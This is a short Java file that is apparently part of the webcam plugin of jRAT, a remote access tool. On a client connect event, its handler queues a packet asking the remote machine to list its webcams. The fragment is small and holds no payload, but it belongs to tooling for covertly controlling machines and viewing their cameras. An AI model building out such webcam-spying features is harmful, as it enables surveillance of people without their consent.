package jrat.plugin.webcam.client;

import jrat.api.Client;
import jrat.api.events.AbstractEvent;
import jrat.api.events.Event;
import jrat.api.events.OnConnectEvent;

public class ConnectHandler extends Event {

	@Override
	public void perform(AbstractEvent event) {
		if (event instanceof OnConnectEvent) {
			Client client = ((OnConnectEvent) event).getServer();
			try {
				client.addToSendQueue(new OutgoingPacket121ListWebcams(client));
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}			
	}

}
